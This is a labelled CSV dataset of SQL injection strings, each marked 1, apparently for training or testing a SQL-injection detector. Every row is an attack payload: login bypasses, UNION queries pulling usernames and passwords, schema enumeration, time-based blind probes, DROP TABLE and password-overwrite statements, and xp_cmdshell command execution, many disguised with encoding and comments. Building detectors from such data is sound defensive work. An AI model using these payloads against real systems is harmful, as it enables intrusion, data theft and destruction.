Sentence,Label
ADMIN'/* AND 1=1--280,1
0x27; UPDATE users SET password=0x27hacked0x27----,1
user') OR 1=1-- AND 1=1325 AND 1=1 OR 1=1,1
"1"" UNION SELECT NULL,NULL--# OR 1=1984498",1
'/**/OR/**/'1'='1'/**/--282/*,1
"admin' UNION SELECT NULL,NULL,NULL--/*##",1
ADMIN'/*172620849196533--546,1
' AND 2=CAST((SELECT @@version) AS int)----,1
""" OR ""1""=""1--322852 AND 1=1",1
%27%20AND%201%3DCONVERT%28int%2C%28SELECT%20%40%40version%29%29--184603,1
admin' OR 1=1--/* OR 1=1,1
""" OR 1=1#-- OR 1=1#805192",1
'+OR+'1'='1'+--,1
"admin"" UNION ALL SELECT NULL--24127474161427 OR 1=1",1
admin' UNION ALL SELECT NULL--24--,1
useradmin' OR '1'='1--/*467--,1
"admin"" UNION SELECT NULL,NULL,NULL---- AND 1=1226118504",1
ADMIN'/*172620 OR 1=1/*,1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1812371/* AND 1=1",1
' OR '1'='1' /*#--558,1
"test' UNION SELECT 1,2,3-- AND 1=1512 AND 1=130910",1
""" OR 1=1#---- OR 1=1621",1
"testadmin"" OR 1=1-- AND 1=1 AND 1=1665",1
1%27%3B%20DROP%20TABLE%20users--/*277915,1
""" AND extractvalue(1,concat(0x7e,version()))--271",1
' OR 1=1#----#184137850 AND 1=1,1
"user"" OR 1=1/* AND 1=1--/*770",1
"1"" UNION SELECT NULL----159667-- OR 1=1",1
"admin"" UNION SELECT NULL,NULL-- AND 1=1404",1
""" OR ""1""=""1"" /*##256176561",1
"99""; INSERT INTO users VALUES(""hacked"",""pass"")-- OR 1=1210784425",1
' OR '2'='213/*# OR 1=1822970,1
1admin' OR '1'='1/*/*588,1
"admin1"" OR ""1"" = ""1# AND 1=1#--495",1
'%20or%201=1#/*119319423,1
"test1"" UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=1 OR 1=1",1
';%20EXEC%20xp_cmdshell('dir')--# AND 1=1202/* OR 1=1--,1
' OR 1=1##--,1
1' OR '1' = '1 AND 1=1 OR 1=1 OR 1=1,1
1%27%20OR%20%271%27%20%3D%20%271/*40360,1
"99"" AND BENCHMARK(5000000,MD5(""A""))-- OR 1=1878 OR 1=1192",1
%2527%2520UNION%2520SELECT%2520NULL%252CNULL%252CNULL---- AND 1=1,1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1838289",1
1%2527%2520AND%2520BENCHMARK%25285000000%252CMD5%2528%2527A%2527%2529%2529--309462/*317909,1
"admin"" OR ""1""=""1--90 AND 1=1",1
' AND 2=CAST((SELECT @@version) AS int)--390,1
'%09or%091=1# AND 1=11 OR 1=1,1
"test' UNION SELECT 1,2,3-- AND 1=1512 AND 1=197507",1
"""%20or%201=1/*835 OR 1=1/*",1
"admin1"" OR ""1"" = ""1# OR 1=1/*67721 AND 1=1",1
'/**/OR/**/'1'='1'/**/-- OR 1=1575--,1
')/**/OR/**/1=1--717,1
"""/**/OR/**/1=1-- OR 1=1/*857890/*",1
"1"" UNION SELECT NULL----159334239248#",1
%2527%2520OR%25201%253D1%2523495,1
'%09UNION%09ALL%09SELECT%09NULL-- OR 1=1# OR 1=1,1
'+OR+1=1----883,1
"test"" UNION SELECT NULL,NULL--/* AND 1=1683",1
test1' OR '1' = '1/*#63257751843,1
"admin"" UNION ALL SELECT NULL--24127474161427444",1
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))--761--/*#230903",1
""" OR 1=1#----# AND 1=1-- AND 1=1876 AND 1=1300",1
"1' UNION SELECT username,password FROM users--#",1
"1"" OR ""1""=""1/* AND 1=1 OR 1=1/* OR 1=1497--#",1
"1'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1 AND 1=1 OR 1=1-- AND 1=1/*734",1
"test' UNION SELECT 1,2,3-- AND 1=1512 AND 1=1677 OR 1=1",1
""")+OR+(""1""=""1-- AND 1=1 AND 1=1979",1
testadmin' OR '1'='1/*745,1
"1'%09UNION%09SELECT%09NULL,column_name%09FROM%09information_schema.columns--#/* AND 1=1423",1
%27%20OR%20%271%27%3D%271%27%20--525,1
"1""; INSERT INTO users VALUES(""hacked"",""pass"")----454",1
test') OR ('1'='1-- AND 1=1327,1
' OR '99'='99--,1
'%20UNION%20ALL%20SELECT%20NULL-- AND 1=1281 AND 1=1,1
1' OR 1=1/*/*854,1
"1';%09INSERT%09INTO%09users%09VALUES('hacked','pass')----",1
admin%27%20OR%20%271%27%3D%27120 AND 1=140892,1
admin' UNION SELECT NULL-- AND 1=1#645/*735 AND 1=1/*/* OR 1=1#,1
admin' OR '1'='1 AND 1=1998826911,1
adminadmin' OR '1'='1/*--/*217 AND 1=1/*,1
1' OR '1' = '1 AND 1=1566869,1
"user' UNION SELECT username,password FROM users----506623",1
admin0x27/*467468 OR 1=1708912,1
admin'/**/OR/**/1=1-- OR 1=1 OR 1=1756710 OR 1=1--124909,1
admin' OR 1=1/*##487 OR 1=1179,1
"test"" OR 1=1##93399320489",1
"'%20UNION%20SELECT%20NULL,NULL,NULL--511138/*81237",1
' UNION SELECT NULL--/*622/*427/*25640770608,1
' or 1=1--73843508,1
1') OR ('1'='1/*,1
"""%20or%201=1/*835/*#442504",1
"""; ExeC XP_cmdSheLl(""Dir"")----/* OR 1=1",1
"' AND extractvalue(99,concat(0x7e,version()))-- OR 1=1498",1
"99'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1210784675",1
"admin"" OR 1=1-- OR 1=1 AND 1=1 AND 1=1# AND 1=1",1
""";%09EXEC%09xp_cmdshell(""dir"")---- AND 1=1887639/*",1
""" UNION SELECT username,password FROM users--/* OR 1=1",1
"1';/**/INSERT/**/INTO/**/users/**/VALUES('hacked','pass')----#",1
' AND 2=CAST((SELECT @@version) AS int)--881553475,1
"11"" UNION SELECT NULL,table_name FROM information_schema.tables--/*",1
'/**/OR/**/'1'='1'/**/--/*75#591 AND 1=124,1
"""+OR+1=1----966993",1
10x27; WAITFOR DELAY 0x2700:00:050x27----928 AND 1=1/*884,1
0x27; DROP TABLE users--15#701--793#,1
"ADMIN""/*172247/*309883",1
""" UNION ALL SELECT NULL--#/*#",1
1' UNION SELECT NULL------,1
1' OR '1' = '1 AND 1=1566 OR 1=1 OR 1=133#492,1
"""/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))-- OR 1=1 OR 1=1/*",1
' OR '2'='2277288,1
%2527%253B%2520SELECT%2520SLEEP%25285%2529-- AND 1=1228 AND 1=1,1
"' union select null,null,null--# AND 1=1--491361826",1
""" OR 1=1#----#312--",1
"testadmin"" OR ""1""=""1 AND 1=1 OR 1=1 OR 1=1637",1
admin' OR 1=1/*## OR 1=1429,1
"""/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--#----",1
'+OR+'1'='1--549#155,1
"aDMin""/* OR 1=1/*964",1
1' UNION SELECT NULL---- AND 1=1 AND 1=1 OR 1=1,1
"' union select null,null,null--# AND 1=1--682546788",1
' or 2=2/*/* AND 1=1,1
"99""; INSERT INTO users VALUES(""hacked"",""pass"")-- OR 1=1210784 OR 1=1379586",1
1%27%3B%20DROP%20TABLE%20users--/*586237#,1
"admin' UNION SELECT NULL,NULL--#12231",1
"""%20or%201=1/*835/*#442861",1
admin1' OR '1' = '1--/*/*814-- OR 1=1--,1
' or 2=2/* AND 1=1/* AND 1=1613,1
'+OR+1=1#/*# AND 1=1/* AND 1=1400,1
1' OR 'a'='a544/*165,1
' OR 99=99#199,1
admin' UNION SELECT NULL-- AND 1=1#645/*735909--166,1
""" AND extractvalue(1,concat(0x7e,version()))-- OR 1=1278583236--171",1
"test"" UNION SELECT NULL,NULL--/* AND 1=1/*743",1
admin1' OR '1' = '1--279# AND 1=1 OR 1=1191,1
""" OR ""2""=""213/*584164586",1
"' AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953961",1
"' union select 1,2,3--",1
admin' OR 1=1#/*120637687959,1
test' OR 1=1##/* OR 1=1-- OR 1=134,1
"user' UNION SELECT NULL,NULL--# OR 1=1/*173",1
"user' UNION SELECT 1,2,3-- AND 1=1749378",1
' OR '2'='213973 AND 1=1--53 AND 1=1635/*,1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1812371/*650",1
99' OR '99' = '99,1
""" OR 99=99##7741",1
'%20or%201=1--969 OR 1=1637,1
admin' OR 'a'='a/*--,1
' OR 1=1/*--711,1
' OR '2'='2/*#,1
"admin1"" OR ""1"" = ""1# AND 1=1#785489831--/*917614",1
"1"" OR ""1""=""1 OR 1=1 AND 1=1",1
1' OR '1' = '1 AND 1=1566 OR 1=1 OR 1=1855,1
admin%27%20OR%20%271%27%3D%27120 AND 1=1476,1
"1' UNION SELECT NULL,table_name FROM information_schema.tables--",1
1'%09AND%09pg_sleep(5)--/*,1
""" UNION SELECT NULL--/*622/*42723926",1
"'%20UNION%20SELECT%20NULL,NULL,NULL--511138/*8739",1
1' OR 'a'='a544#80 AND 1=1543,1
"1"" OR ""1""=""1/* AND 1=1 OR 1=1/* OR 1=1659--745",1
10x27; WAITFOR DELAY 0x2700:00:050x27-- AND 1=1 OR 1=1,1
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--138--442",1
"test' UNION SELECT 1,2,3--/*#974 OR 1=1#75 AND 1=1688",1
'; ExeC XP_cmdSheLl('Dir')----/*850,1
"admin"" UNION SELECT NULL,NULL,NULL---- AND 1=1226#",1
' UNION SELECT NULL--/*622/*-- AND 1=1 AND 1=1,1
"useradmin"" OR 1=1--#572 OR 1=1-- OR 1=1",1
';%09EXEC%09xp_cmdshell('dir')---- AND 1=1887461310,1
"""%20or%201=1/*835 OR 1=1620 OR 1=1",1
"1"" UNION SELECT NULL----159334593107 AND 1=1 OR 1=1 OR 1=1 OR 1=1 OR 1=1",1
test' OR 1=1##/* OR 1=1-- OR 1=1 OR 1=1,1
"user' UNION SELECT NULL,NULL--# OR 1=1#266#",1
"""/**/OR/**/""1""=""1",1
"""%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=17993509777507",1
"user"") OR (""1""=""1 OR 1=1900",1
' UNION SELECT NULL--/*622/*427/*256 OR 1=1 AND 1=1377,1
%27%20OR%201%3D1/%2A,1
"test"" UNION SELECT 1,2,3-- AND 1=1512577904",1
"test1"" UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=1----773865--",1
1' OR '1' = '1 AND 1=1 AND 1=1/*993960322,1
"admin1"" OR 1 = 1--141",1
' OR '2'='2 AND 1=1 AND 1=1--173----652,1
""" OR ""1""=""1 AND 1=1104#",1
0x27 UNION ALL SELECT NULL--415482/* AND 1=1,1
"admin' UNION SELECT username,password FROM users-- AND 1=1/*948",1
"1""+UNION+SELECT+NULL,table_name+FROM+information_schema.tables-- AND 1=1 AND 1=1 OR 1=1",1
"testadmin"" OR ""1""=""1 AND 1=1613----#542",1
""")+OR+(""1""=""1-- AND 1=1729603",1
"1"" UNION SELECT NULL----395/*293",1
"admin' UNION SELECT NULL,NULL,NULL--/*# AND 1=1372#",1
' OR '1'='1#400939,1
"' union select null,null,null--552344",1
"'%09UNION%09SELECT%09NULL,NULL--21884",1
user' OR 'a'='a----#/*,1
'%20or%201=1--969 OR 1=1/*215 OR 1=1786532,1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/* OR 1=1## OR 1=1679664279",1
testadmin' OR 1=1-- AND 1=1#,1
"1"";%20WAITFOR%20DELAY%20""00:00:05""--828 AND 1=1",1
"admin1' UNION SELECT NULL,table_name FROM information_schema.tables--813968#783",1
"user"") OR (""1""=""1 AND 1=1626 AND 1=1871",1
' or 1=1--73843 OR 1=1,1
admin1' OR '1' = '1--279# AND 1=1115,1
user') OR ('1'='1--167387715966,1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1812#/*/*500--",1
admin'%20OR%20'1'='1 AND 1=1400#,1
"user' UNION SELECT 1,2,3-- AND 1=1223 AND 1=1",1
'; UPDATE USERS SET PASSWORD='HACKED'--69164 AND 1=1739,1
'/**/OR/**/'1'='1'/**/--/*/*,1
"'%09UNION%09SELECT%09username,password%09FROM%09users----486#",1
'+OR+1=1#/*/*--,1
"""/**/OR/**/1=1-- OR 1=1/*857470924140233",1
1' OR '1'='1/* AND 1=1 OR 1=1 AND 1=1,1
%27%20or%201%3D1%2F%2A,1
admin' UNION ALL SELECT NULL----478,1
"1"" OR ""1"" = ""1 AND 1=1742395669",1
"2"" OR ""2"" = ""2163254#/*97#133648",1
"test' UNION SELECT 1,2,3-- AND 1=1512475",1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1367831",1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311#/*",1
"1"" UNION SELECT NULL----159334593107 AND 1=1 OR 1=1 AND 1=1905",1
"1"" UNION SELECT NULL,NULL------611-- OR 1=1--377670",1
"admin' UNION SELECT NULL,NULL,NULL--/*# AND 1=1372131",1
%27%20OR%20%271%27%3D%271%27%20--406,1
"admin1"" OR ""1"" = ""1# OR 1=1538325",1
'/**/OR/**/1=1-- OR 1=1 OR 1=1#152,1
' UNION ALL SELECT NULL--# OR 1=1/*,1
"1' UNION SELECT NULL,table_name FROM information_schema.tables----",1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311# OR 1=1654",1
"' union select null,null,null--# AND 1=1--534",1
admin' UNION SELECT NULL----607#653856,1
"2"" OR ""2"" = ""2163254#/*97 OR 1=1",1
"test1"" OR ""1"" = ""1/*",1
admin'/**/OR/**/1=1-- OR 1=1402 OR 1=1907,1
ADMIN'/* AND 1=1911/*,1
' or 2=2----973 AND 1=1,1
user' OR '1'='1#315-- AND 1=1/* OR 1=1,1
' or 2=2--# AND 1=12,1
user' UNION ALL SELECT NULL--/*/*156,1
admin' UNION ALL SELECT NULL--24127# AND 1=1323,1
' or 2=2/*36752 AND 1=1,1
' OR '2'='2#,1
"admin1"" OR ""1"" = ""1# AND 1=1#/*",1
""" UNION SELECT NULL,NULL,NULL--/*--",1
user' OR 'a'='a----360,1
"""%20or%201=1# AND 1=1 OR 1=1447847695",1
user' OR '1'='1' /*##,1
1' OR 'a'='a544#--/*,1
"""/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--138 OR 1=1#",1
0x27 UNION ALL SELECT NULL--415482/*718,1
' OR '2'='213973 AND 1=1--53785,1
"test' UNION SELECT 1,2,3--/*10 AND 1=1# AND 1=1 OR 1=1",1
""" AND extractvalue(1,concat(0x7e,version()))-- OR 1=1278# AND 1=1",1
"user"" OR 1=1/*----",1
""" OR 1=1#----# AND 1=1-- AND 1=1777--",1
"1"" UNION SELECT 1,2,3-- AND 1=1----56264",1
""") OR (""1""=""1/*",1
"admin"" OR ""1""=""1946# AND 1=1",1
'/**/OR/**/1=1-- OR 1=1 AND 1=1494,1
1'%09AND%09pg_sleep(5)--860 OR 1=125816# OR 1=1,1
"""+OR+1=1#/*#",1
admin' UNION SELECT NULL-- AND 1=1#645/*73554,1
"test' UNION SELECT username,password FROM users-- AND 1=1 AND 1=1/*",1
1'/**/AND/**/pg_sleep(5)--604,1
'/**/OR/**/1=1-- OR 1=1876--/*--20 OR 1=1479,1
adminadmin' OR '1'='1/*-- OR 1=1,1
"admin1"" OR ""1"" = ""1#/* OR 1=1",1
"user"" OR 1=1--/*",1
1' OR 'a'='a544#80473,1
'+OR+1=1#/*# AND 1=1/*#/*/* OR 1=1 OR 1=1##914,1
'; ExeC XP_cmdSheLl('Dir')----39,1
admin'#/*#,1
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))--761--/*##510",1
"""/**/OR/**/1=1-- OR 1=1/*857470924140634",1
"1'; INSERT INTO users VALUES('hacked','pass')--739# AND 1=1651311",1
"test"" UNION SELECT NULL,NULL--/*978558655/*",1
10x27 OR 0x2710x27 = 0x271,1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1#892--107",1
"admin' UNION SELECT 1,2,3--#343451--536652",1
'%20or%201=1/*835257/* OR 1=1/*250 AND 1=1,1
admin'%20OR%20'1'='1 AND 1=1590,1
"1"" UNION SELECT NULL,NULL------611-- OR 1=1--377 OR 1=1989106462 OR 1=1",1
""" OR ""2""=""2 AND 1=1#",1
%27%20or%201%3D1%23 AND 1=1,1
"admin' UNION SELECT username,password FROM users-- AND 1=1/* AND 1=1475",1
1' OR '1' = '1 AND 1=1566 OR 1=1 OR 1=1--,1
"test' UNION SELECT 1,2,3--/*#974 OR 1=1164 OR 1=1",1
admin'/**/OR/**/1=1-- OR 1=1 OR 1=1756 AND 1=1,1
"admin' UNION SELECT NULL,NULL,NULL--/*# AND 1=1708--",1
test1' OR '1' = '1/*#632797,1
"' UNION SELECT NULL,NULL,NULL--241 AND 1=1",1
"1"" OR ""1""=""1/* AND 1=1 OR 1=1/* OR 1=1659596/*",1
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--# AND 1=168647",1
admin'%20OR%20'1'='1 AND 1=1987 AND 1=1/*,1
"admin"") OR (""1""=""1# OR 1=1601 AND 1=1815 OR 1=1 OR 1=1/*575",1
"user"" UNION SELECT NULL,NULL--/* OR 1=1428209",1
1'%09AND%09pg_sleep(5)--860513 OR 1=1723650,1
10x27; WAITFOR DELAY 0x2700:00:050x27-- AND 1=1 AND 1=1435854 AND 1=1,1
'/**/OR/**/'1'='1'/**/-- OR 1=1575518#,1
1'%09AND%09pg_sleep(5)-- AND 1=1,1
"useradmin"" OR 1=1--#429",1
"test' UNION SELECT NULL,NULL--/*978558--",1
"user' UNION SELECT 1,2,3-- AND 1=1223 OR 1=1",1
"ADMIN""/*172871638939",1
"1""+UNION+SELECT+NULL,table_name+FROM+information_schema.tables-- AND 1=1964379",1
"1"" UNION SELECT NULL,NULL,NULL--149639",1
"user"" OR ""1""=""1#-- OR 1=1 OR 1=1265",1
' UNION SELECT NULL--/*622/*427/*256819,1
test' UNION SELECT NULL----#261--907,1
"'%09UNION%09SELECT%09NULL,NULL--21495#",1
' OR '2'='213973 AND 1=1 OR 1=1927,1
'/**/OR/**/1=1-- OR 1=1428,1
"2"" OR ""2"" = ""2163254#/*547",1
admin' OR 2=2--925/*,1
""";%20EXEC%20xp_cmdshell(""dir"")--",1
"1"" UNION SELECT NULL,NULL------611/*190--",1
1' UNION SELECT NULL--,1
"test1"" OR ""1"" = ""1/*# AND 1=1--631/*817",1
"""%20UNION%20ALL%20SELECT%20NULL--908#565393383799",1
"99'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1210958236--217745",1
1%27%3B%20INSERT%20INTO%20users%20VALUES%28%27hacked%27%2C%27pass%27%29--#579,1
admin' OR '99'='99596 AND 1=1,1
"""+OR+""1""=""1--77#",1
"admin"" UNION SELECT 1,2,3-- AND 1=1957725#",1
admin1' OR '1' = '1--/*60386 AND 1=1,1
10x27; WAITFOR DELAY 0x2700:00:050x27----928 AND 1=1 OR 1=1406899,1
"admin' UNION SELECT 1,2,3----811-- OR 1=1--282530",1
"""/**/UNION/**/SELECT/**/NULL,NULL,NULL--306239",1
admin1' OR '1' = '1--/*603#937485,1
'+or+1=1# OR 1=1 AND 1=1 OR 1=1815,1
"user"" UNION SELECT 1,2,3--#775",1
' OR '1'='1' /*#6,1
"""%09UNION%09SELECT%09username,password%09FROM%09users---- OR 1=1",1
admin1' OR '1' = '1--/*60386608/*,1
""")+OR+(""1""=""1 AND 1=1875963",1
"user"") OR 1=1-- AND 1=1/* OR 1=1537",1
admin'/**/OR/**/1=1-- OR 1=1 OR 1=1756710 OR 1=1----,1
'/**/OR/**/'1'='1'/**/--/*75#259,1
')+OR+('1'='1 AND 1=1 OR 1=1--171 AND 1=1,1
1' UNION SELECT NULL--#,1
"1' UNION SELECT username,password FROM users--65241666",1
""" OR 99=99##77/*",1
1' OR '1' = '1 AND 1=1 AND 1=1/*702963,1
"99"" AND BENCHMARK(5000000,MD5(""A""))-- OR 1=1595",1
""";+EXEC+xp_cmdshell(""dir"")--## AND 1=1 AND 1=1--",1
"""%20or%201=1--969 OR 1=1/*309",1
"admin"" UNION SELECT NULL-- AND 1=1#645/*735909--",1
""" OR 1=1#----# AND 1=1-- AND 1=1777/*",1
"test' UNION SELECT 1,2,3--/*#931",1
"""+OR+""1""=""1--720878",1
"1'; INSERT INTO users VALUES('hacked','pass')--739--353##",1
""" OR 99=99##77471",1
useradmin' OR 1=1----852,1
"test"" UNION SELECT NULL,NULL--/*978558655923",1
"1'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1 AND 1=1 OR 1=1-- OR 1=1",1
admin' OR '99'='99 OR 1=1713956,1
1') OR 1=1--#,1
""" OR 1=1/*--929888602",1
1%27%3B%20DROP%20TABLE%20users--/*228,1
1' OR '1'='1' --# AND 1=1#,1
'/**/OR/**/'1'='1'/**//*589 OR 1=1 AND 1=1 AND 1=1,1
'/**/OR/**/'a'='a300,1
"admin"" UNION SELECT NULL-- AND 1=1#645/*735 AND 1=1#/*",1
""" OR 1=1/*--929888258",1
'%20or%201=1# AND 1=1 AND 1=1 OR 1=1429845781#,1
admin1' OR '1' = '1--/*603#937149995915408821,1
1'%20AND%20pg_sleep(5)--636189 AND 1=1,1
"' union select null,null,null--# AND 1=1-- AND 1=1517",1
"1"" UNION SELECT NULL----159 AND 1=1",1
1'%09AND%09pg_sleep(5)--860 OR 1=1258190#,1
"0x27 UNION SELECT NULL,NULL--",1
'+OR+1=1#/*# AND 1=1/*#/*/* OR 1=1 OR 1=1610,1
""";+EXEC+xp_cmdshell(""dir"")-- AND 1=1 AND 1=1706",1
1' OR '1' = '1 AND 1=1 AND 1=1/*99389,1
') OR ('1'='1/* OR 1=1--/* AND 1=1658,1
"admin"" UNION ALL SELECT NULL--24127474161--291",1
1' OR '1'='1' --#412640681798542,1
"""+UNION+SELECT+NULL--608168322",1
"99'; INSERT INTO users VALUES('hacked','pass')--372816#47764",1
useradmin' OR '1'='1--#,1
'%20or%201=1/*835257/* OR 1=1545,1
admin%27%20OR%20%271%27%3D%27120 AND 1=140 AND 1=1 AND 1=1 OR 1=1 OR 1=1319,1
"""%20or%201=1#428187691141--",1
"test' UNION SELECT NULL,NULL--/*978#643",1
0x27) OR 1=1--##,1
1'%20AND%20pg_sleep(5)--636189/*,1
"'%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=1799--",1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/*/*975",1
test' UNION SELECT NULL----#261--233,1
""" OR ""1""=""1#358--",1
'/**/OR/**/'a'='a922980622971/*381/*,1
""" AND extractvalue(1,concat(0x7e,version()))--161/*#129",1
"admin' UNION SELECT NULL,NULL,NULL--/*# AND 1=1353",1
"""%09UNION%09SELECT%09NULL,NULL-- OR 1=199",1
%2527%2520AND%2520extractvalue%25281%252Cconcat%25280x7e%252Cversion%2528%2529%2529%2529-- OR 1=1/*,1
1' OR '1' = '1 AND 1=1/*,1
""" OR ""1""=""1--322852 OR 1=1",1
admin' UNION ALL SELECT NULL--24/*#,1
"' UNION SELECT USERNAME,PASSWORD FROM USERS--/*345",1
"ADMIN""/*172247/*79966",1
2' OR 2 = 2--730/*52,1
"test"" UNION SELECT NULL----#",1
' or 2=2----973#,1
'%20or%201=1--969 OR 1=1 AND 1=1/*,1
""" or 2=2/* AND 1=1#876",1
1admin' OR '1'='1/*/* AND 1=1,1
') OR ('1'='1/* OR 1=1--/* AND 1=1924,1
"test' UNION SELECT 1,2,3--/*#974#637",1
"admin1"" OR ""1"" = ""1# AND 1=1#785 AND 1=1",1
"' union select null,null,null--# AND 1=1--491504",1
"1""%09AND%09pg_sleep(5)--860513 OR 1=1723/*214",1
' OR '2'='2 OR 1=1702481,1
1' OR 'a'='a544#--292,1
admin1' OR '1' = '1--/*/*814-- OR 1=1481,1
0x27 UNION ALL SELECT NULL--415482/*921 OR 1=1,1
""" OR ""2""=""213973 AND 1=1 OR 1=1",1
admin' UNION SELECT NULL-- AND 1=1#36707,1
"user"" OR 1=1/*/* AND 1=1--118",1
""" UNION ALL SELECT NULL--/* AND 1=1--483",1
user') OR 1=1-- AND 1=188235030750969,1
1%27%3B%20DROP%20TABLE%20users--/*586#,1
1'%09AND%09pg_sleep(5)--860 OR 1=1258--530,1
"'%20UNION%20SELECT%20NULL,NULL,NULL----#712 AND 1=1/*",1
admin%27%20OR%20%271%27%3D%27120 AND 1=1#871646,1
%27%20OR%20%27a%27%3D%27a/*678,1
"admin1"" OR ""1"" = ""1# OR 1=1538#",1
';%09EXEC%09xp_cmdshell('dir')---- AND 1=1947,1
' OR '1'='1 AND 1=1 OR 1=1384,1
"1';+INSERT+INTO+users+VALUES('hacked','pass')--805",1
"1"") OR 1=1----36",1
'%20or%201=1##--825,1
admin%27%20OR%20%271%27%3D%27120 AND 1=140 AND 1=1546,1
"1'; INSERT INTO users VALUES('hacked','pass')--739-- OR 1=1518212",1
'%09OR%091=1--#/*,1
""" or 2=2--#468",1
"' union select null,null,null--748/*925",1
"test' UNION SELECT username,password FROM users--/*-- AND 1=1785",1
11' OR 1 = 1/*574,1
"1""%20UNION%20SELECT%20NULL,table_name%20FROM%20information_schema.tables-- OR 1=1--198",1
1' OR '1'='1' --/*612 AND 1=1766,1
"testadmin"" OR ""1""=""1/*",1
"1"" OR ""1"" = ""1 AND 1=1742395# OR 1=1",1
"test1"" UNION SELECT NULL,table_name FROM information_schema.tables------",1
'/**/OR/**/'1'='1'/**/-- OR 1=1575904,1
"""; UPDATE USERS SET PASSWORD=""HACKED""--69164 OR 1=1#921",1
2' OR '2' = '2163254#820145 OR 1=1,1
' UNION SELECT NULL--/*622/*427/*256 OR 1=1 AND 1=1 AND 1=1,1
%2527%2520or%25201%253D1/%252A523443,1
1' OR '1' = '1 AND 1=1566 OR 1=1 OR 1=1###,1
1' OR '1' = '1-- AND 1=1/*,1
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))--761--/*/*",1
') OR ('2'='2 OR 1=1290--,1
%2527%2520OR%2520%25271%2527%253D%25271%2527%2520/%252A,1
"1';+INSERT+INTO+users+VALUES('hacked','pass')-- AND 1=1248874",1
'%20UNION%20ALL%20SELECT%20NULL-- AND 1=1281#,1
'+OR+'1'='1--/* OR 1=1,1
admin0x27/*58763955,1
1%27%20OR%20%271%27%20%3D%20%271/*403/*,1
admin' OR 1=1#177840139,1
'%20or%201=1/*83525738383394576,1
'+OR+1=1#/*# AND 1=1/*#/*/* OR 1=184,1
ADMIN'/*172620279668528,1
1'/**/AND/**/SLEEP(5)--18,1
admin'/**/OR/**/1=1-- OR 1=140228351,1
admin1' OR '1' = '1--/*603#937149 OR 1=1,1
'/**/OR/**/1=1-- OR 1=1876--/* AND 1=1,1
ADMIN'/* AND 1=191156480,1
' OR '2'='2277272904,1
10x27-- OR 1=1,1
')/**/OR/**/1=1--# AND 1=1,1
' or 1=1--73 OR 1=1,1
"""+UNION+SELECT+NULL--608168194",1
' OR 'a'='a8398922 OR 1=1,1
""" OR ""99""=""99"" -- AND 1=1",1
"99'; INSERT INTO users VALUES('hacked','pass')--372816#--252696/* AND 1=1",1
' OR '2'='2277 AND 1=1,1
"admin1"" OR ""1"" = ""1# AND 1=1#785489383#746",1
admin1' OR '1' = '1--/*/*814--982,1
"1"" OR ""1"" = ""1 AND 1=1742395#632",1
'%20or%201=1--969 OR 1=1122418,1
admin' UNION SELECT NULL----607# OR 1=1,1
"test' UNION SELECT 1,2,3--/*#974#/*",1
"""/**/OR/**/1=1-- OR 1=1876666--",1
""" OR 99=99##77489",1
"1"" UNION SELECT NULL,NULL------611-- OR 1=1547",1
"1'%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/* OR 1=1# OR 1=1",1
